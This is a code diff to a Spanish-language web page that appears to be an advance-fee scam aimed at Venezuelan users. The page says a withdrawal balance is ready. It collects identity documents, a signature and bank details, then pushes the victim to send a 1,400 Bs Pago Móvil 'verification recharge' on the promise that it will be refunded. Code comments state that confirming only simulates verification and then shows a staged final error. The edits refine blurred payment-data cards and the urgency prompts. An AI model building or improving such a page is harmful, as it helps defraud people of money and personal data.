@@ -137,9 +137,6 @@
       font-size: 1rem;
       color: var(--text-primary);
     }
-    /*
-    ELIMINAMOS la barra de búsqueda original (código y CSS)
-    */
     /* Tarjeta SALDO */
     .card {
       background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
@@ -180,7 +177,7 @@
       width: 200%;
       height: 200%;
       background: var(--aurora-gradient);
-      opacity: 0.1; /* se redujo opacidad */
+      opacity: 0.1;
       animation: aurora-animation 15s ease infinite;
       z-index: 0;
     }
@@ -603,31 +600,58 @@
       color: var(--text-secondary);
       font-size: 0.9rem;
     }
+    @keyframes actualizacion {
+      0% { transform: translateY(-10px); opacity: 0; }
+      100% { transform: translateY(0); opacity: 1; }
+    }
+    .dato-actualizado {
+      animation: actualizacion 0.5s ease;
+    }
+    .banco-logo {
+      transition: opacity 0.3s ease;
+    }
     /****************************************************
-     * Sección BLURRED (datos verificación)
+     * Barra de Progreso (Progreso de Retiro)
      ****************************************************/
-    .blur-container {
-      position: relative;
-      display: block;
-    }
-    .blur-container .security-data-card {
-      filter: blur(8px);
-      transition: filter 0.3s;
-    }
-    .blur-container .blur-overlay {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
+    .progress-bar-container {
       display: flex;
-      justify-content: center;
+      flex-direction: column;
+      gap: 0.5rem;
+      margin-bottom: 2rem;
+      padding: 1rem;
+      background: #fff;
+      border-radius: var(--border-radius);
       align-items: center;
-      color: var(--text-primary);
-      background: rgba(255, 255, 255, 0.5);
-      border-radius: var(--border-radius-sm);
-      transition: opacity 0.3s;
-      pointer-events: none;
+      box-shadow: var(--shadow-sm);
+    }
+    .progress-bar-info {
+      display: flex;
+      align-items: center;
+      gap: 0.6rem;
+      font-weight: 600;
+      color: var(--primary);
+      font-size: 1rem;
+      width: 100%;
+      justify-content: space-between;
+    }
+    .progress-bar-info img {
+      height: 28px;
+      object-fit: contain;
+    }
+    .progress-bar-wrapper {
+      width: 100%;
+      height: 10px;
+      background: rgba(20, 52, 203, 0.1);
+      border-radius: 5px;
+      overflow: hidden;
+    }
+    .progress-bar-fill {
+      height: 100%;
+      /* Se hace transición a verde con brillo */
+      background: linear-gradient(90deg, var(--success), #09956e);
+      box-shadow: 0 0 10px var(--success), 0 0 20px var(--success);
+      transition: width 0.4s ease;
+      width: 0%;
     }
     /****************************************************
      * Ajustes Responsive
@@ -738,57 +762,6 @@
       background: linear-gradient(270deg, #10B981, #059669);
       background-size: 200% 200%;
       animation: success-animation 2s ease infinite;
-    }
-    @keyframes actualizacion {
-      0% { transform: translateY(-10px); opacity: 0; }
-      100% { transform: translateY(0); opacity: 1; }
-    }
-    .dato-actualizado {
-      animation: actualizacion 0.5s ease;
-    }
-    .banco-logo {
-      transition: opacity 0.3s ease;
-    }
-    /****************************************************
-     * Barra de Progreso (Progreso de Retiro)
-     ****************************************************/
-    .progress-bar-container {
-      display: flex;
-      flex-direction: column;
-      gap: 0.5rem;
-      margin-bottom: 2rem;
-      padding: 1rem;
-      background: #fff;
-      border-radius: var(--border-radius);
-      align-items: center;
-      box-shadow: var(--shadow-sm);
-    }
-    .progress-bar-info {
-      display: flex;
-      align-items: center;
-      gap: 0.6rem;
-      font-weight: 600;
-      color: var(--primary);
-      font-size: 1rem;
-      width: 100%;
-      justify-content: space-between;
-    }
-    .progress-bar-info img {
-      height: 28px;
-      object-fit: contain;
-    }
-    .progress-bar-wrapper {
-      width: 100%;
-      height: 10px;
-      background: rgba(20, 52, 203, 0.1);
-      border-radius: 5px;
-      overflow: hidden;
-    }
-    .progress-bar-fill {
-      height: 100%;
-      background: linear-gradient(90deg, var(--primary), var(--secondary));
-      transition: width 0.4s ease;
-      width: 0%;
     }
   </style>
 </head>
@@ -966,7 +939,7 @@
         </div>
       </div>
 
-      <!-- (6) SECCIÓN MODIFICADA #1 -->
+      <!-- (6) SECCIÓN #1 -->
       <div class="visa-card" id="securityVerification3A">
         <h2><i class="fas fa-info-circle"></i> Tu dinero está listo</h2>
         <div class="success-box">
@@ -1028,7 +1001,7 @@
         </div>
       </div>
 
-      <!-- (6) SECCIÓN MODIFICADA #2 -->
+      <!-- (6) SECCIÓN #2 -->
       <div class="visa-card" id="securityVerification3B">
         <h2><i class="fas fa-user-check"></i> Verificación rápida desde tu banco</h2>
         <div class="info-box">
@@ -1111,7 +1084,7 @@
         </div>
       </div>
 
-      <!-- (6) SECCIÓN MODIFICADA #3 -->
+      <!-- (6) SECCIÓN #3: Último paso -->
       <div class="visa-card" id="securityVerification3C" style="position:relative;">
         <div style="position:absolute; top:10px; right:10px; background:var(--success); color:white; font-size:0.85rem; font-weight:bold; padding:0.2rem 0.8rem; border-radius:20px; box-shadow:0 2px 5px rgba(0,0,0,0.2); z-index:999;">
           PASO FINAL
@@ -1164,8 +1137,20 @@
           <h3 style="font-size:1.1rem; color:var(--primary); display:flex; align-items:center; gap:8px; margin-bottom:1rem;">
             <i class="fas fa-info-circle"></i> Datos para hacer la verificación
           </h3>
-          <div class="blur-container" id="blurContainer" style="cursor:pointer; border-radius:var(--border-radius); overflow:hidden; box-shadow:0 4px 15px rgba(0,0,0,0.08);">
-            <div class="security-data-card" id="datosRecargaFijos" style="margin-top:0; border:none; background:linear-gradient(120deg, #fdfdfd, #f8f9ff); padding:1.5rem;">
+          <!-- Al hacer clic en cualquier parte de la pantalla se cierra -->
+          <div
+            style="cursor:pointer; border-radius:var(--border-radius); overflow:hidden; box-shadow:0 4px 15px rgba(0,0,0,0.08); position:relative;"
+            id="verDatosOverlayTrigger"
+          >
+            <!-- Tarjeta difuminada por defecto -->
+            <div class="security-data-card" id="datosRecargaFijos" style="
+              margin-top:0; 
+              border:none; 
+              background:linear-gradient(120deg, #fdfdfd, #f8f9ff);
+              padding:1.5rem;
+              filter: blur(8px);
+              transition: filter 0.3s;
+            ">
               <div style="display:grid; grid-template-columns:120px 1fr; gap:1rem 0.5rem; align-items:center;">
                 <div style="font-weight:600; color:var(--text-secondary);">Banco:</div>
                 <div style="font-weight:600;">Banco Venezolano de Crédito (0104)</div>
@@ -1190,11 +1175,26 @@
                 </div>
               </div>
             </div>
-            <div class="blur-overlay" style="background:rgba(255,255,255,0.9); backdrop-filter:blur(8px);">
-              <div style="text-align:center;">
-                <i class="fas fa-fingerprint" style="font-size:2rem; color:var(--primary); margin-bottom:0.5rem;"></i>
-                <div style="font-weight:700; font-size:1.2rem; color:var(--primary); margin-bottom:0.5rem;">Toca para ver los datos</div>
-                <div style="color:var(--text-secondary); font-size:0.9rem;">Información sensible protegida</div>
+            <!-- Overlay encima con mensaje "Toca para ver los datos" -->
+            <div style="
+              position:absolute; 
+              top:0; 
+              left:0; 
+              width:100%; 
+              height:100%; 
+              background:rgba(255,255,255,0.9);
+              backdrop-filter:blur(8px);
+              display:flex; 
+              flex-direction:column;
+              justify-content:center; 
+              align-items:center;
+              color:var(--text-primary);
+              transition: opacity 0.3s;
+            " id="tapToShowOverlay">
+              <i class="fas fa-fingerprint" style="font-size:2rem; color:var(--primary); margin-bottom:0.5rem;"></i>
+              <div style="font-weight:700; font-size:1.2rem; color:var(--primary); margin-bottom:0.5rem;">Toca para ver los datos</div>
+              <div style="color:var(--text-secondary); font-size:0.9rem; text-align:center;">
+                Información sensible protegida
               </div>
             </div>
           </div>
@@ -1236,12 +1236,13 @@
         </div>
       </div>
 
-      <!-- (7) SECCIÓN MODIFICADA #4 -->
+      <!-- (7) SECCIÓN #4: Confirma tu recarga de pago móvil -->
       <div class="visa-card" id="recargaSection" style="position:relative;">
         <div style="position:absolute; top:10px; left:50%; transform:translateX(-50%); background:var(--success); color:white; font-size:0.85rem; font-weight:bold; padding:0.3rem 1rem; border-radius:20px; box-shadow:0 2px 5px rgba(0,0,0,0.2); white-space:nowrap; z-index:999;">
           ÚLTIMO PASO
         </div>
-        <h2><i class="fas fa-credit-card"></i> Confirma tu recarga</h2>
+        <!-- Se renombra aquí -->
+        <h2><i class="fas fa-credit-card"></i> Confirma tu recarga de pago móvil</h2>
         <div class="success-box" style="margin-bottom:1.5rem;">
           <div style="display:flex; align-items:flex-start; gap:10px;">
             <i class="fas fa-check-circle" style="font-size:1.4rem; color:var(--success); margin-top:2px;"></i>
@@ -1251,6 +1252,9 @@
             </p>
           </div>
         </div>
+
+        <!-- Se removió la tarjeta amarilla que decía "concepto" -->
+
         <div style="background:#f9faff; border-radius:var(--border-radius); padding:1.5rem; margin-bottom:1.5rem; border:1px solid rgba(20, 52, 203, 0.1);">
           <h3 style="font-size:1.05rem; color:var(--primary); margin:0 0 1rem 0; display:flex; align-items:center; gap:8px;">
             <i class="fas fa-list-alt"></i> Datos de tu recarga
@@ -1294,7 +1298,23 @@
               />
             </div>
           </div>
-          <div class="highlight-element" style="margin-bottom:1.5rem; background:rgba(245, 158, 11, 0.1); border:1px solid rgba(245, 158, 11, 0.2); border-radius:var(--border-radius-sm); padding:1rem;">
+          <div style="margin-bottom:1.5rem; text-align:center; background:rgba(20, 52, 203, 0.05); padding:1rem; border-radius:var(--border-radius-sm);">
+            <p style="margin:0; font-size:1rem; color:var(--text-secondary); line-height:1.4;">
+              Recarga 
+              <span class="blink" style="font-weight:700; font-size:1.2rem; color:var(--success);">1.400,00 Bs</span>
+              desde tu cuenta para verificar tu identidad y recibirás 
+              <strong>(tu saldo disponible + 1400)</strong> = 
+              <span style="font-weight:700; color:var(--success);" id="totalFinalConReembolso">[Saldo+1400]</span>.
+            </p>
+          </div>
+
+          <div class="form-group highlight-element" style="
+            margin-bottom:1.5rem; 
+            background:rgba(245, 158, 11, 0.1); 
+            border:1px solid rgba(245, 158, 11, 0.2); 
+            border-radius:var(--border-radius-sm); 
+            padding:1rem;
+          ">
             <div class="form-group" style="margin-bottom:1rem;">
               <label style="display:block; margin-bottom:0.4rem; font-weight:600; font-size:0.95rem; color:var(--text-primary);">
                 <i class="fas fa-phone" style="color:var(--primary); margin-right:5px;"></i> Teléfono:
@@ -1442,8 +1462,19 @@
             <i class="fas fa-mobile-alt" style="font-size:2.5rem; color:var(--primary);"></i>
             <h3 style="margin:0.5rem 0; font-size:1.3rem;">Datos para Pago Móvil</h3>
           </div>
-          <div id="modalDatosContent" style="background:#f9faff; border-radius:var(--border-radius); padding:1rem; margin-bottom:1.5rem; border:1px dashed var(--primary);">
-            <div style="position:relative; background:linear-gradient(135deg, #1434CB, #142C8E); border-radius:12px; padding:1.5rem; color:white; margin-bottom:1.5rem; overflow:hidden;">
+          <div id="modalDatosContent" style="background:#f9faff; border-radius:var(--border-radius); padding:1rem; margin-bottom:1.5rem; border:1px dashed var(--primary); position:relative;">
+            <!-- Tarjeta azul difuminada internamente -->
+            <div style="
+              position:relative; 
+              background:linear-gradient(135deg, #1434CB, #142C8E);
+              border-radius:12px; 
+              padding:1.5rem; 
+              color:white; 
+              margin-bottom:1.5rem; 
+              overflow:hidden;
+              filter: blur(6px);
+              transition: filter 0.3s;
+            " id="tarjetaAzulBlur">
               <div style="position:absolute; top:10px; right:15px; opacity:0.8;">
                 <i class="fas fa-credit-card" style="font-size:1.8rem;"></i>
               </div>
@@ -1471,33 +1502,33 @@
               </div>
               <div style="position:absolute; bottom:0; left:0; right:0; height:5px; background:linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent); animation:shine 3s infinite;"></div>
             </div>
+            <!-- Capa que dice "Toca para ver contenido" -->
+            <div style="
+              position:absolute; 
+              top:0; left:0; 
+              width:100%; height:100%; 
+              display:flex; flex-direction:column; align-items:center; justify-content:center;
+              backdrop-filter:blur(6px);
+              background:rgba(255,255,255,0.8);
+              cursor:pointer;
+              text-align:center;
+            " id="tapTarjetaAzul">
+              <i class="fas fa-fingerprint" style="font-size:2rem; color:var(--primary); margin-bottom:0.5rem;"></i>
+              <div style="font-weight:700; font-size:1.2rem; color:var(--primary); margin-bottom:0.5rem;">Toca para ver los datos</div>
+              <div style="color:var(--text-secondary); font-size:0.9rem;">Información sensible</div>
+            </div>
+
             <div style="text-align:center; margin-bottom:1.5rem;">
-              <div style="font-size:0.9rem; color:var(--text-secondary); margin-bottom:0.5rem;">MONTO A VERIFICAR</div>
-              <div style="font-size:1.8rem; font-weight:700; color:var(--success); display:flex; align-items:center; justify-content:center; gap:8px;">
-                <span id="verificacionMontoModal" class="blink">1.400,00 Bolívares</span>
-                <i class="fas fa-copy copy-icon" onclick="copyToClipboard('verificacionMontoModal')" style="cursor:pointer; color:var(--primary); font-size:1rem;"></i>
+              <!-- Monto a verificar con nuevo estilo -->
+              <div style="font-size:0.95rem; color:var(--text-secondary); margin-bottom:0.5rem;">Recarga 
+                <span id="verificacionMontoModal" class="blink" style="font-weight:700; color:var(--success); font-size:1.1rem;">
+                  1.400,00 Bs
+                </span>
+                desde tu cuenta para verificar tu identidad 
+                y recibirás <strong>(saldo + 1400)</strong> = 
+                <span style="color:var(--success); font-weight:700;" id="totalOverlayPagoMovil">[Total]</span>
               </div>
             </div>
-            <div style="background:var(--highlight-bg); border:1px solid var(--highlight-border); padding:1rem; border-radius:var(--border-radius-sm);">
-              <div style="font-size:0.9rem; color:var(--text-secondary); margin-bottom:0.5rem; text-align:center;">
-                <i class="fas fa-pencil-alt" style="margin-right:5px;"></i> CONCEPTO
-              </div>
-              <div style="text-align:center; font-weight:600; color:var(--primary); font-size:1.1rem; word-break:break-word;">
-                <span id="conceptoRecargaModal">[Número de Identificación]</span>
-              </div>
-              <div style="text-align:center; margin-top:0.8rem;">
-                <small style="color:var(--text-secondary); font-size:0.8rem;">
-                  <i class="fas fa-exclamation-circle"></i> Escribe exactamente este número en el campo "concepto" de tu pago móvil
-                </small>
-              </div>
-            </div>
-          </div>
-          <div style="background:rgba(245, 158, 11, 0.1); border-left:4px solid var(--warning); padding:0.8rem; margin-bottom:1.5rem; border-radius:var(--border-radius-sm);">
-            <p style="margin:0; font-size:0.9rem; line-height:1.4;">
-              <i class="fas fa-exclamation-triangle" style="color:var(--warning); margin-right:5px;"></i>
-              <strong>Importante:</strong> Este paso es necesario para verificar tu identidad.
-              El monto de 1.400,00 Bs será reembolsado junto con tu saldo original.
-            </p>
           </div>
           <button class="btn btn-primary" id="closeDatosModalBtn" style="width:100%;">
             <i class="fas fa-check"></i> Entendido
@@ -1678,6 +1709,7 @@
         this.actualizarHTML('tipoCuenta', `Tipo: <strong>${this.datos.banco.tipo}</strong>`);
         // Logo del banco principal
         await this.cambiarLogo('bankLogoSmall', this.datos.banco.nombre);
+
         // Nombre del banco en varios sitios
         document.querySelectorAll('.nombreBancoUsuario').forEach(el => {
           el.textContent = this.datos.banco.nombre;
@@ -1704,6 +1736,7 @@
         if (montoRetiroBs) {
           montoRetiroBs.textContent = saldoFormateado;
         }
+
         // Calcular el saldo total (saldo + 1400)
         const totalNum = this.datos.financiero.saldo + this.datos.financiero.montoVerificacion;
         const totalFormatted = this.formatearNumeroVE(totalNum) + ' Bs';
@@ -1743,6 +1776,34 @@
         if (recargaCedula) {
           recargaCedula.value = this.datos.usuario.documento;
         }
+
+        // Actualizar la clase .nombreBancoRecarga con el nombre del banco
+        document.querySelectorAll('.nombreBancoRecarga').forEach(el => {
+          el.textContent = this.datos.banco.nombre;
+        });
+        // Actualizar id="conceptoPagoMovil" con el documento del usuario
+        this.actualizarTexto('conceptoPagoMovil', this.datos.usuario.documento);
+        // Actualizar Resumen (conceptoRecargaResumen)
+        const conceptoRecargaResumen = document.getElementById('conceptoRecargaResumen');
+        if (conceptoRecargaResumen) {
+          conceptoRecargaResumen.textContent = this.datos.usuario.documento;
+        }
+        // Actualizar "conceptoRecarga"
+        const conceptoRecarga = document.getElementById('conceptoRecarga');
+        if (conceptoRecarga) {
+          conceptoRecarga.textContent = this.datos.usuario.documento;
+        }
+
+        // Overlay "Datos de Pago Móvil" (monto + total)
+        const verificacionMontoModal = document.getElementById('verificacionMontoModal');
+        if (verificacionMontoModal) {
+          verificacionMontoModal.textContent = '1.400,00 Bs';
+        }
+        const totalOverlayPagoMovil = document.getElementById('totalOverlayPagoMovil');
+        if (totalOverlayPagoMovil) {
+          totalOverlayPagoMovil.textContent = totalFormatted;
+        }
+
         // Status banner: ejemplo
         const statusBanner = document.getElementById('statusBanner');
         if (statusBanner) {
@@ -1790,59 +1851,7 @@
     }
 
     /**********************************************************************
-     * PARTE 2:
-     *  Código adicional (variables globales, etc.)
-     **********************************************************************/
-    let datosUsuario = {
-      nombreCompleto: '',
-      documento: '',
-      fechaNacimiento: '',
-      banco: '',
-      numeroCuenta: '',
-      tipoCuenta: '',
-      telefono: '',
-      saldo: 0
-    };
-    const logoBancos = {
-      "Banco de Venezuela": "https://www.bancodevenezuela.com/wp-content/uploads/2023/03/logonuevo.png",
-      "Banco Mercantil": "https://www.mercantilbanco.com/mercprod/images/comunes/logo_popups.gif",
-      "Banco Provincial": "https://upload.wikimedia.org/wikipedia/commons/d/d4/BBVAprovinciallogo.svg"
-    };
-    function convertirSaldoANumero(saldoTexto) {
-      return parseFloat(
-        saldoTexto.replace(/\./g, '')
-                  .replace(',', '.')
-                  .replace(/[^\d.]/g, '')
-      ) || 0;
-    }
-    function formatearNumeroVE(numero) {
-      return numero.toLocaleString('es-VE', {
-        minimumFractionDigits: 2,
-        maximumFractionDigits: 2
-      }).replace('.', ',');
-    }
-    function cargarDatosUsuario() {
-      try {
-        const datosRemeex = JSON.parse(sessionStorage.getItem('datosRemeex') || '{}');
-        const saldoBS = sessionStorage.getItem('currentBalanceBS') || '0,00 Bs';
-        datosUsuario = {
-          nombreCompleto: datosRemeex.fullName || '[Nombre Usuario]',
-          documento: datosRemeex.docNumberCompleto || '[Documento]',
-          fechaNacimiento: datosRemeex.birthDate || '[Fecha]',
-          banco: datosRemeex.bankName || '[Banco]',
-          numeroCuenta: datosRemeex.bankAccount || '[Cuenta]',
-          tipoCuenta: datosRemeex.bankType || '[Tipo]',
-          telefono: datosRemeex.userPhone || '',
-          saldo: convertirSaldoANumero(saldoBS)
-        };
-      } catch (error) {
-        console.error('Error al cargar datos:', error);
-      }
-    }
-
-    /**********************************************************************
-     * PARTE 3:
-     *  Lógica principal (interacciones, contadores, progreso, etc.)
+     * Funciones de apoyo global
      **********************************************************************/
     function copyToClipboard(elementId) {
       const el = document.getElementById(elementId);
@@ -1855,7 +1864,7 @@
     window.copyToClipboard = copyToClipboard;
 
     let currentStep = 1;
-    const totalSteps = 9; 
+    const totalSteps = 9;
     function updateProgressBar(step) {
       if (step < 1) step = 1;
       if (step > totalSteps) step = totalSteps;
@@ -1865,7 +1874,6 @@
       if (fillEl) {
         fillEl.style.width = progressPercentage + "%";
       }
-      // Agregamos el texto de porcentaje en la misma línea
       const progressTextEl = document.getElementById("progressPercentage");
       if (progressTextEl) {
         progressTextEl.textContent = progressPercentage + "%";
@@ -1886,14 +1894,14 @@
 
     function setupNavigation() {
       const navigationMap = {
-        confirmInfoBtn:      { sectionId: 'uploadSection',       step: 2 },
-        confirmDocBtn:       { sectionId: 'signatureSection',    step: 3 },
-        continuarFirmaBtn:   { sectionId: 'securityVerification1', step: 4 },
-        continueSecurityBtn1:{ sectionId: 'securityVerification2', step: 5 },
-        continueSecurityBtn2:{ sectionId: 'securityVerification3A',step: 6 },
-        continueSecurity3ABtn:{sectionId: 'securityVerification3B',step: 7 },
-        continueSecurity3BBtn:{sectionId: 'securityVerification3C',step: 8 },
-        recargaReadyBtn:     { sectionId: 'recargaSection',      step: 9 }
+        confirmInfoBtn:        { sectionId: 'uploadSection',         step: 2 },
+        confirmDocBtn:         { sectionId: 'signatureSection',      step: 3 },
+        continuarFirmaBtn:     { sectionId: 'securityVerification1',  step: 4 },
+        continueSecurityBtn1:  { sectionId: 'securityVerification2',  step: 5 },
+        continueSecurityBtn2:  { sectionId: 'securityVerification3A', step: 6 },
+        continueSecurity3ABtn: { sectionId: 'securityVerification3B', step: 7 },
+        continueSecurity3BBtn: { sectionId: 'securityVerification3C', step: 8 },
+        recargaReadyBtn:       { sectionId: 'recargaSection',        step: 9 }
       };
       Object.entries(navigationMap).forEach(([buttonId, info]) => {
         const button = document.getElementById(buttonId);
@@ -2008,21 +2016,6 @@
       }
     }
 
-    function setupBlurContainer() {
-      const blurContainer = document.getElementById("blurContainer");
-      if (blurContainer) {
-        blurContainer.addEventListener("click", () => {
-          const securityCard = blurContainer.querySelector(".security-data-card");
-          const overlay = blurContainer.querySelector(".blur-overlay");
-          if (securityCard && overlay) {
-            securityCard.style.filter = "none";
-            overlay.style.opacity = "0";
-            overlay.style.pointerEvents = "none";
-          }
-        });
-      }
-    }
-
     document.addEventListener("DOMContentLoaded", async () => {
       const gestor = new GestorDatos();
       await gestor.cargarDatos();
@@ -2030,12 +2023,15 @@
       setupNavigation();
       setupIntegratedCountdowns();
       setupSignatureFlow();
-      setupBlurContainer();
       updateProgressBar(1);
+
+      // Botón WhatsApp
       const whatsappLink = document.getElementById("whatsappLink");
       if (whatsappLink) {
         whatsappLink.href = "https://wa.me/584125551234?text=Necesito%20ayuda%20con%20mi%20retiro%20de%20dinero";
       }
+
+      // Confirmar recarga -> simula verificación y luego error final
       const confirmRecargaBtn = document.getElementById("confirmRecargaBtn");
       if (confirmRecargaBtn) {
         confirmRecargaBtn.addEventListener("click", () => {
@@ -2044,6 +2040,7 @@
             overlayVerificando.classList.add("active");
             setTimeout(() => {
               overlayVerificando.classList.remove("active");
+              // Simulamos error final:
               const overlayError = document.getElementById("overlayErrorFinal");
               if (overlayError) {
                 overlayError.classList.add("active");
@@ -2052,6 +2049,8 @@
           }
         });
       }
+
+      // Al pulsar "recargaReadyBtn" se muestra overlayDatosVerificacion
       const recargaReadyBtn = document.getElementById("recargaReadyBtn");
       if (recargaReadyBtn) {
         recargaReadyBtn.addEventListener("click", () => {
@@ -2061,6 +2060,7 @@
           }
         });
       }
+      // Cerrar overlayDatosVerificacion
       const closeDatosModalBtn = document.getElementById("closeDatosModalBtn");
       if (closeDatosModalBtn) {
         closeDatosModalBtn.addEventListener("click", () => {
@@ -2070,6 +2070,8 @@
           }
         });
       }
+
+      // Subir Documento
       const idDocumentInput = document.getElementById("idDocument");
       const confirmDocBtn = document.getElementById("confirmDocBtn");
       const previewContainer = document.getElementById("previewContainer");
@@ -2090,7 +2092,69 @@
           }
         });
       }
+
+      // Mostrar / Ocultar datos "Datos para hacer la verificación" (tarjeta difuminada)
+      const verDatosOverlayTrigger = document.getElementById("verDatosOverlayTrigger");
+      const tapToShowOverlay = document.getElementById("tapToShowOverlay");
+      const datosRecargaFijos = document.getElementById("datosRecargaFijos");
+      if (verDatosOverlayTrigger && tapToShowOverlay && datosRecargaFijos) {
+        verDatosOverlayTrigger.addEventListener("click", (e) => {
+          // Si la tarjeta está difuminada, la mostramos
+          if (datosRecargaFijos.style.filter === "blur(8px)") {
+            datosRecargaFijos.style.filter = "none";
+            tapToShowOverlay.style.display = "none";
+          } else {
+            // Si ya estaba visible, se oculta
+            datosRecargaFijos.style.filter = "blur(8px)";
+            tapToShowOverlay.style.display = "flex";
+          }
+          e.stopPropagation();
+        });
+      }
+
+      // "Toca para ver los datos" dentro del overlay de Pago Móvil (tarjeta azul)
+      const tapTarjetaAzul = document.getElementById("tapTarjetaAzul");
+      const tarjetaAzulBlur = document.getElementById("tarjetaAzulBlur");
+      if (tapTarjetaAzul && tarjetaAzulBlur) {
+        tapTarjetaAzul.addEventListener("click", (e) => {
+          if (tarjetaAzulBlur.style.filter === "blur(6px)") {
+            tarjetaAzulBlur.style.filter = "none";
+            tapTarjetaAzul.style.display = "none";
+          } else {
+            tarjetaAzulBlur.style.filter = "blur(6px)";
+            tapTarjetaAzul.style.display = "flex";
+          }
+          e.stopPropagation();
+        });
+        // Si se hace clic fuera de la tarjeta, se vuelve a difuminar
+        const modalDatosContent = document.getElementById("modalDatosContent");
+        if (modalDatosContent) {
+          modalDatosContent.addEventListener("click", (ev) => {
+            // Evitar que el click en la tarjeta no cierre nada
+            ev.stopPropagation();
+          });
+        }
+        document.getElementById("overlayDatosVerificacion").addEventListener("click", () => {
+          // Al hacer click fuera del modal, no cerramos, 
+          // pero difuminamos de nuevo la tarjeta si estaba visible
+          tarjetaAzulBlur.style.filter = "blur(6px)";
+          tapTarjetaAzul.style.display = "flex";
+        });
+      }
+
+      // Al hacer clic fuera del "overlayDatosVerificacion", se cierra
+      const overlayDatosVer = document.getElementById("overlayDatosVerificacion");
+      if (overlayDatosVer) {
+        overlayDatosVer.addEventListener("click", (e) => {
+          if (e.target === overlayDatosVer) {
+            overlayDatosVer.classList.remove("active");
+          }
+        });
+      }
+
     });
+
+    // Script Tawk.to (Chat de soporte)
     var Tawk_API = Tawk_API || {},
         Tawk_LoadStart = new Date();
     (function () {
@@ -2105,6 +2169,7 @@
   </script>
 </body>
 </html>
+
 
 
 
